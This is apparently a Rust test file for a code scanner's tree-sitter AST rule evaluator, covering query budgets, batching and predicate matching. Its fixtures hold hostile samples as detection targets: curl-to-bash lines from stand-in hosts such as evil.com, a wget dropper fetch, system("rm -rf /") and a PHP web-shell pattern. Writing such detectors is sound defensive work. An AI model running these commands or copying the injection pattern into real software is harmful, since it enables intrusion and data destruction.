//! Test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for AST-based condition evaluators.

use super::*;
use crate::composite_rules::context::{AnalysisWarning, ConditionResult, EvaluationContext};
use crate::composite_rules::types::FileType;
use crate::types::{AnalysisReport, TargetInfo};

fn create_test_report(path: &str) -> AnalysisReport {
    let target = TargetInfo {
        path: path.to_string(),
        file_type: "source".to_string(),
        size_bytes: 1024,
        sha256: "abc123".to_string(),
        architectures: None,
    };
    AnalysisReport::new(target)
}

fn create_test_context<'a>(
    report: &'a AnalysisReport,
    data: &'a [u8],
    file_type: FileType,
) -> EvaluationContext<'a> {
    EvaluationContext::test_only_new(report, data, file_type)
}

/// Parse `source` via filefacts so AST-based tests have a real tree to
/// match against. The returned `ParsedFile` must outlive the
/// `EvaluationContext` the test then builds. The extension hint comes
/// from `path`; pick a name that matches `file_type`.
fn parsed_for_test<'a>(path: &str, source: &'a [u8]) -> filefacts::ParsedFile<'a> {
    let parsed = filefacts::OpenOptions::new()
        .path(std::path::Path::new(path))
        .open(source);
    let _ = parsed.values(); // prime the parse so source_ast() returns Some
    parsed
}

/// Like [`create_test_context`] but with `cached_ast` populated from
/// a pre-parsed filefacts handle. Use this for any test that exercises
/// AST condition evaluation.
fn create_test_context_with_ast<'a>(
    report: &'a AnalysisReport,
    parsed: &'a filefacts::ParsedFile<'a>,
    data: &'a [u8],
    file_type: FileType,
) -> EvaluationContext<'a> {
    let mut ctx = EvaluationContext::test_only_new(report, data, file_type);
    ctx.cached_ast = parsed.source_ast().map(|a| a.tree);
    ctx
}

/// Count how many times `query_str` matches `tree`.
fn run_query_count(
    lang: &tree_sitter::Language,
    query_str: &str,
    tree: &tree_sitter::Tree,
    src: &[u8],
) -> Option<usize> {
    use streaming_iterator::StreamingIterator;
    let query = tree_sitter::Query::new(lang, query_str).ok()?;
    let mut cursor = tree_sitter::QueryCursor::new();
    let mut count = 0usize;
    let mut matches = cursor.matches(&query, tree.root_node(), src);
    while matches.next().is_some() {
        count += 1;
    }
    Some(count)
}

#[test]
fn ast_query_cpu_budget_applies_without_outer_deadline() {
    assert_eq!(
        super::ast::ast_query_cpu_budget("(identifier) @id", None),
        crate::analyzers::ast_walker::AST_QUERY_CPU_BUDGET,
        "direct scans still need the per-query CPU ceiling"
    );
}

#[test]
fn ast_query_caps_multiple_unbounded_sibling_wildcards() {
    let query = "((object (pair) (_)* (pair) (_)* (pair)))";
    assert_eq!(
        super::ast::ast_query_cpu_budget(query, None),
        std::time::Duration::from_millis(100)
    );
    assert_eq!(
        super::ast::ast_query_cpu_budget("((object (pair) (_) * (pair) (_) * (pair)))", None),
        std::time::Duration::from_millis(100),
        "whitespace in the query must not bypass the expensive-pattern cap"
    );
    assert_eq!(
        super::ast::ast_query_cpu_budget("((object (pair) (_)* (pair)))", None),
        crate::analyzers::ast_walker::AST_QUERY_CPU_BUDGET,
        "a single sibling wildcard keeps the normal budget"
    );
}

#[test]
fn ast_query_cpu_timeout_returns_partial_result_with_limit_warning() {
    let mut source = String::from("const config = {");
    for i in 0..512 {
        source.push_str(&format!(" option_{i}: \"value\","));
    }
    source.push_str("};");
    let report = create_test_report("large-config.js");
    let parsed = parsed_for_test("large-config.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let query = "((object (pair)*) @object)";

    let result = super::ast::eval_ast_query_with_budget(query, &ctx, std::time::Duration::ZERO);

    assert!(
        result
            .warnings
            .iter()
            .any(|warning| matches!(warning, AnalysisWarning::AstTooDeep { max_depth: 0 })),
        "a timed-out partial query must be reported to callers"
    );
}

#[test]
fn ast_query_group_state_headroom_preserves_wide_credential_object_match() {
    // This is ordinary configuration data, but the production credential
    // query has two unanchored sibling wildcards. Many unrelated settings
    // between the credential fields increase the active query states.
    let mut source = String::from("const config = { host: \"api.example\",");
    for i in 0..8 {
        source.push_str(&format!(" option_before_user_{i}: \"value\","));
    }
    source.push_str(" username: \"service-account\",");
    for i in 0..8 {
        source.push_str(&format!(" option_before_password_{i}: \"value\","));
    }
    source.push_str(" password: \"ordinary-config-secret\" };");

    let parsed = parsed_for_test("large-config.js", source.as_bytes());
    let query = r#"((object
      (pair key: (property_identifier) @host_key value: (string) @host_value)
      (_)*
      (pair key: (property_identifier) @username_key value: (string) @username_value)
      (_)*
      (pair key: (property_identifier) @password_key value: (string) @password_value))
      (#match? @host_key "(?i)^(host|hostname|server)$")
      (#match? @username_key "(?i)^(user|username|account)$")
      (#match? @password_key "(?i)^(pass|passwd|password)$")
      )"#;

    assert_eq!(super::ast::AST_QUERY_GROUP_STATE_LIMIT, 16384);
    let report = create_test_report("large-config.js");
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    // The corresponding production trait has no count filter, so its normal
    // evaluator may stop after the first valid credential-object match.
    let _match_count_guard = super::symbol_string::MatchCountGuard::set(false);
    // This test is about query-state headroom, not CPU time: the 100ms
    // multi-wildcard budget (covered by the pathological test below) is
    // tight enough for a debug build on a loaded SMT core to exceed it.
    let result =
        super::ast::eval_ast_query_with_budget(query, &ctx, std::time::Duration::from_secs(30));
    assert!(
        result.matched,
        "the production AST evaluator preserves the match; warnings={:?}, match_count={}",
        result.warnings, result.match_count
    );
    assert!(
        !result
            .warnings
            .iter()
            .any(|warning| matches!(warning, AnalysisWarning::AstQueryLimited { limit: 16384 })),
        "the normal configuration query does not surface a state-limit warning"
    );
}

#[test]
fn ast_query_pathological_wildcard_expansion_obeys_cpu_budget() {
    let mut source = String::from("const config = { host: \"api.example\",");
    for i in 0..96 {
        source.push_str(&format!(" option_before_user_{i}: \"value\","));
    }
    source.push_str(" username: \"service-account\",");
    for i in 0..96 {
        source.push_str(&format!(" option_before_password_{i}: \"value\","));
    }
    source.push_str(" password: \"ordinary-config-secret\" };");

    let report = create_test_report("large-config.js");
    let parsed = parsed_for_test("large-config.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let query = r#"((object
      (pair key: (property_identifier) @host_key value: (string) @host_value)
      (_)*
      (pair key: (property_identifier) @username_key value: (string) @username_value)
      (_)*
      (pair key: (property_identifier) @password_key value: (string) @password_value))
      (#match? @host_key "(?i)^(host|hostname|server)$")
      (#match? @username_key "(?i)^(user|username|account)$")
      (#match? @password_key "(?i)^(pass|passwd|password)$")
      )"#;
    let result = super::ast::eval_ast_query_with_budget(query, &ctx, std::time::Duration::ZERO);
    assert!(
        result
            .warnings
            .iter()
            .any(|warning| matches!(warning, AnalysisWarning::AstTooDeep { max_depth: 0 })),
        "pathological wildcard expansion remains interruptible under the CPU budget"
    );
}

/// Establishes a baseline: `tree_sitter::Query::new` compiled-and-run from many
/// threads, each with its own query and tree, is deterministic. This PASSES —
/// which RULES OUT bare concurrent compilation as the cause of the parallel
/// archive-analysis finding drift. That bug only reproduces with the shared
/// `QUERY_CACHE` under eviction (see `tests/archive_determinism_test.rs`), so it
/// lives in the cache/eviction/shared-`Arc` interaction, not in `Query::new`
/// itself. Kept as a guard against tree-sitter regressing this property.
#[test]
fn concurrent_query_new_is_deterministic() {
    let source: &[u8] =
        b"function f(){ const a = new Date(); const b = new Date(); const c = new Date(); return a; }";
    let parsed = parsed_for_test("module.js", source);
    let tree = parsed.source_ast().expect("source_ast").tree;
    let lang = tree.language();
    let query_str = "(new_expression) @x";

    let expected = run_query_count(&lang, query_str, tree, source).expect("baseline compile");
    assert!(
        expected >= 3,
        "fixture should yield >=3 new_expression matches, got {expected}"
    );

    const THREADS: usize = 16;
    const ITERS: usize = 400;
    let observed: std::sync::Mutex<std::collections::BTreeSet<Option<usize>>> =
        std::sync::Mutex::new(std::collections::BTreeSet::new());

    std::thread::scope(|scope| {
        for _ in 0..THREADS {
            let observed = &observed;
            let tree_clone = tree.clone();
            scope.spawn(move || {
                // `tree_sitter::Language` is `!Sync`; each thread derives its
                // own from its tree clone. The shared state under test is the
                // grammar the language points to, which `Query::new` reads.
                let lang = tree_clone.language();
                for _ in 0..ITERS {
                    let n = run_query_count(&lang, query_str, &tree_clone, source);
                    observed.lock().expect("mutex").insert(n);
                }
            });
        }
    });

    let observed = observed.into_inner().expect("mutex");
    assert_eq!(
        observed,
        std::collections::BTreeSet::from([Some(expected)]),
        "concurrent Query::new produced inconsistent match counts: {observed:?} \
         (expected every run to be Some({expected}))"
    );
}

#[test]
fn eval_ast_query_caps_total_captures() {
    let mut source = String::new();
    for i in 0..(AST_QUERY_CAPTURE_LIMIT + 100) {
        source.push_str(&format!("a{i};\n"));
    }
    let report = create_test_report("/test/many-identifiers.js");
    let parsed = parsed_for_test("many-identifiers.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("(identifier) @id"),
        false,
        &ctx,
    );

    assert!(result.matched);
    assert_eq!(result.match_count, AST_QUERY_CAPTURE_LIMIT);
    assert!(
        result
            .warnings
            .iter()
            .any(|w| matches!(w, AnalysisWarning::AstQueryLimited { limit } if *limit == AST_QUERY_CAPTURE_LIMIT)),
        "expected AST query limit warning, got {:?}",
        result.warnings
    );
}

// =============================================================================
// eval_ast tests - Simple mode (kind/node + pattern matching)
// =============================================================================

#[test]
fn test_eval_ast_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_python_function_call() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls -la")
exec("print('hello')")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
}

#[test]
fn test_eval_ast_python_string_literal() {
    let report = create_test_report("/test/script.py");
    let source = r#"
url = "http://malicious.com/payload"
cmd = "/bin/sh"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("malicious"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_exact_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = "ls"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Note: In Python's AST, the string node includes the quotes: "ls"
    // So we use substr to match the content
    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("ls"), // substr match
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_regex_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
password1 = "secret"
password2 = "hunter2"
api_key = "abc123"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        None,
        Some(r"password\d+"),
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_case_insensitive() {
    let report = create_test_report("/test/script.py");
    let source = r#"
Password = "SECRET"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        Some("password"),
        None,
        None,
        true, // case insensitive
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_node_type_directly() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 42
y = "hello"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Use node parameter instead of kind for direct node type matching
    let result = eval_ast(
        None,
        Some("integer"), // direct tree-sitter node type
        None,
        Some("42"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_shell_command() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl http://evil.com/payload | bash
wget http://malware.com/dropper
"#;
    let parsed = parsed_for_test("script.sh", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("curl"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_javascript_function_call() {
    let report = create_test_report("/test/script.js");
    let source = r#"
const code = "malicious";
eval(code);
new Function("return " + code)();
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("eval"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_go_function_call() {
    let report = create_test_report("/test/main.go");
    let source = r#"
package main

import (
    "os/exec"
)

func main() {
    exec.Command("bash", "-c", "whoami")
}
"#;
    let parsed = parsed_for_test("main.go", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Go);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("Command"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_rust_unsafe_block() {
    let report = create_test_report("/test/main.rs");
    let source = r#"
fn main() {
    unsafe {
        std::ptr::null::<i32>();
    }
}
"#;
    let parsed = parsed_for_test("main.rs", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Rust);

    let result = eval_ast(
        None,
        Some("unsafe_block"),
        None,
        Some("unsafe"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_no_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
print("hello world")
x = 1 + 2
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_no_kind_or_node() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // No kind or node specified - should return no match
    let result = eval_ast(None, None, None, Some("hello"), None, None, false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// eval_ast_query tests - Advanced mode (tree-sitter queries)
// =============================================================================

#[test]
fn test_eval_ast_query_python() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Tree-sitter query to find os.system calls
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "os")
        (#eq? @method "system")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_javascript() {
    let report = create_test_report("/test/script.js");
    let source = r#"
document.write("<script>evil()</script>");
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    // Query for document.write calls
    let query = r#"(call_expression
        function: (member_expression
            object: (identifier) @obj
            property: (property_identifier) @method)
        (#eq? @obj "document")
        (#eq? @method "write")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_invalid_syntax() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Invalid query syntax
    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("((((invalid query syntax"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_shell() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl -s http://evil.com | bash
"#;
    let parsed = parsed_for_test("script.sh", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);

    // Query for pipe to bash
    let query = r#"(pipeline
        (command) @cmd1
        (command
            name: (command_name) @name
            (#eq? @name "bash"))) @pipe"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("(identifier) @id"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_no_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 1 + 2
print(x)
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Query for something that doesn't exist
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "subprocess")
        (#eq? @method "call")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// Edge cases and error handling
// =============================================================================

#[test]
fn test_eval_ast_invalid_utf8() {
    let report = create_test_report("/test/binary");
    let data = vec![0xff, 0xfe, 0x00, 0x01]; // Invalid UTF-8
    let ctx = create_test_context(&report, &data, FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_empty_source() {
    let report = create_test_report("/test/script.py");
    let source = "";
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_malformed_source() {
    let report = create_test_report("/test/script.py");
    // Syntactically invalid Python
    let source = r#"
def incomplete(
    x =
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    // Should handle parse errors gracefully
    assert!(!result.matched);
    // May have warnings about parse errors
}

#[test]
fn test_eval_ast_evidence_location() {
    let report = create_test_report("/test/script.py");
    let source = r#"
# Line 1
# Line 2
exec("malicious")  # Line 4
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
    // Evidence should include line/column location
    let location = result.evidence[0].location.as_ref().unwrap();
    assert!(location.contains(":")); // Format: "line:column"
}

#[test]
fn test_eval_ast_multiple_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(result.evidence.len() >= 3);
}

#[test]
fn test_eval_ast_match_count_supports_count_min() {
    // AST conditions return match_count, which is used by count_min/count_max
    // filtering at the TraitDefinition level. Verify match_count is accurate.
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
eval("code1")
exec("cmd4")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    // match_count must reflect actual AST matches for count_min filtering to work
    assert_eq!(
        result.match_count, 4,
        "match_count should be 4 (one per exec call), got {}",
        result.match_count
    );
}

#[test]
fn test_eval_ast_query_match_count_single() {
    // Verify match_count = 1 when only one AST match exists
    let report = create_test_report("/test/script.py");
    let source = r#"exec("cmd")"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert_eq!(result.match_count, 1);
}

#[test]
fn test_eval_ast_c_system_call() {
    let report = create_test_report("/test/main.c");
    let source = r#"
#include <stdlib.h>
int main() {
    system("rm -rf /");
    return 0;
}
"#;
    let parsed = parsed_for_test("main.c", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::C);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("system"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_php_exec() {
    let report = create_test_report("/test/index.php");
    let source = r#"<?php
$cmd = $_GET['cmd'];
exec($cmd);
?>"#;
    let parsed = parsed_for_test("index.php", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Php);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_predicates_filter_correctly() {
    // Regression: dashed-ip-colon-regex was matching .replace(/[ \t\r\n]+/g," ")
    // because #eq? and #match? predicates were not filtering correctly.
    // The query should only match .replace(/<regex with colon>/, "-")
    let report = create_test_report("/test/prettify.js");
    let source = r#"ac.replace(/[ \t\r\n]+/g," ")"#;
    let parsed = parsed_for_test("prettify.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    // First, verify the query compiles and predicates are actually recognized.
    // Borrow the language straight off the cached tree — no need to keep a
    // per-grammar dependency in cleave just for this test.
    let lang = parsed
        .source_ast()
        .expect("source_ast for js")
        .tree
        .language();
    let lang = &*lang;
    // WRONG: predicates outside the pattern's closing paren become separate patterns
    let wrong_query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
)
(#eq? @prop "replace")
(#match? @pat ":")
(#eq? @repl "-")"#;
    let compiled_wrong = tree_sitter::Query::new(lang, wrong_query).expect("query should compile");
    assert_eq!(
        compiled_wrong.pattern_count(),
        4,
        "wrong query has 4 patterns (structural + 3 predicate-only patterns)"
    );

    // CORRECT: predicates inside the pattern's closing paren
    let query_str = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;
    let compiled = tree_sitter::Query::new(lang, query_str).expect("query should compile");
    assert_eq!(
        compiled.pattern_count(),
        1,
        "correct query should have 1 pattern with predicates inside"
    );

    let result = eval_ast(None, None, None, None, None, Some(query_str), false, &ctx);

    assert!(
        !result.matched,
        "should NOT match .replace(/[ \\t\\r\\n]+/g,\" \") — \
         regex has no colon and replacement is space, not dash. \
         match_count={}, evidence={:?}",
        result.match_count, result.evidence
    );
}

#[test]
fn test_eval_ast_query_predicates_positive_match() {
    // Verify the same query DOES match when the replace has colon regex and dash replacement
    let report = create_test_report("/test/ip.js");
    let source = r#"addr.replace(/:/g,"-")"#;
    let parsed = parsed_for_test("ip.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(
        result.matched,
        "should match .replace(/:/g,\"-\") — regex has colon and replacement is dash"
    );
}

#[test]
fn batch_ast_queries_matches_sequential_eval() {
    let report = create_test_report("/test/script.js");
    let source = r#"
eval("x");
document.write("y");
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_eval = r#"(call_expression
        function: (identifier) @fn
        (#eq? @fn "eval")) @call"#;
    let q_write = r#"(call_expression
        function: (member_expression
            object: (identifier) @obj
            property: (property_identifier) @method)
        (#eq? @obj "document")
        (#eq? @method "write")) @call"#;

    let mut ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let sequential_eval = eval_ast(None, None, None, None, None, Some(q_eval), false, &ctx);
    let sequential_write = eval_ast(None, None, None, None, None, Some(q_write), false, &ctx);
    assert!(sequential_eval.matched);
    assert!(sequential_write.matched);

    let batch = batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[q_eval, q_write],
        None,
        None,
    )
    .expect("two compiling queries should batch");
    assert_eq!(
        batch.get(q_eval).map(|r| (r.matched, r.match_count)),
        Some((sequential_eval.matched, sequential_eval.match_count))
    );
    assert_eq!(
        batch.get(q_write).map(|r| (r.matched, r.match_count)),
        Some((sequential_write.matched, sequential_write.match_count))
    );

    ctx.ast_query_cache = Some(&batch);
    let cached = eval_ast(None, None, None, None, None, Some(q_eval), false, &ctx);
    assert_eq!(cached.match_count, sequential_eval.match_count);
    assert_eq!(cached.matched, sequential_eval.matched);
}

/// A batch shares one walk and one CPU budget, the tightest of its queries.
/// A multi-wildcard query (100ms) stays out, so it cannot cap the ordinary
/// queries beside it; the caller evaluates it alone.
#[test]
fn batch_ast_queries_leaves_out_multi_wildcard_queries() {
    let source = "eval(\"x\");\ndocument.write(\"y\");\nconst c = { a: 1, b: 2 };\n";
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_eval = r#"(call_expression function: (identifier) @fn (#eq? @fn "eval")) @call"#;
    let q_write = r#"(call_expression function: (member_expression) @m) @call"#;
    let q_wide = r#"(object (pair) @a (_)* (pair) @b (_)* (pair) @c)"#;
    let batch = batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[q_eval, q_wide, q_write],
        None,
        None,
    )
    .expect("the two ordinary queries still batch");
    assert!(batch.contains_key(q_eval) && batch.contains_key(q_write));
    assert!(!batch.contains_key(q_wide));
}

#[test]
fn interrupted_ast_batch_does_not_cache_negative_results() {
    let source = "const before = 1;\neval(\"late payload\");\n";
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_eval = r#"(call_expression function: (identifier) @fn (#eq? @fn "eval")) @call"#;
    let q_name = "(identifier) @name";
    let batch = super::ast::batch_ast_queries_with_budget(
        tree,
        source,
        FileType::JavaScript,
        &[q_eval, q_name],
        None,
        None,
        Some(std::time::Duration::ZERO),
    );
    assert!(
        batch.is_none(),
        "an interrupted walk must use per-query fallback"
    );
    let report = create_test_report("script.js");
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let result = super::ast::eval_ast_query(q_eval, &ctx);
    assert!(
        result.matched,
        "the independent query still sees the later call"
    );
}

#[test]
fn batch_ast_queries_keeps_text_predicates() {
    let source = r#"addr.replace(/:/g,"-"); eval("z");"#;
    let parsed = parsed_for_test("ip.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_replace = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;
    let q_eval = r#"(call_expression
        function: (identifier) @fn
        (#eq? @fn "eval")) @call"#;
    let miss_replace = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "nope")
)"#;

    let batch = batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[q_replace, q_eval, miss_replace],
        None,
        None,
    )
    .expect("three compiling queries should batch");
    assert!(batch.get(q_replace).is_some_and(|r| r.matched));
    assert!(batch.get(q_eval).is_some_and(|r| r.matched));
    assert!(
        batch.get(miss_replace).is_some_and(|r| !r.matched),
        "combined query must still apply per-pattern #eq?"
    );
}

#[test]
fn ast_query_evidence_capture_selects_sites_without_filtering_sibling_queries() {
    let selected =
        "(call function: (identifier) @callee arguments: (argument_list) @args) @evidence";
    let legacy = "(call function: (identifier) @callee arguments: (argument_list) @args) @call";
    let _count = super::symbol_string::MatchCountGuard::set(true);
    let source = "emit(123)\nother(456)\n";
    let report = create_test_report("/test/sites.py");
    let parsed = parsed_for_test("sites.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
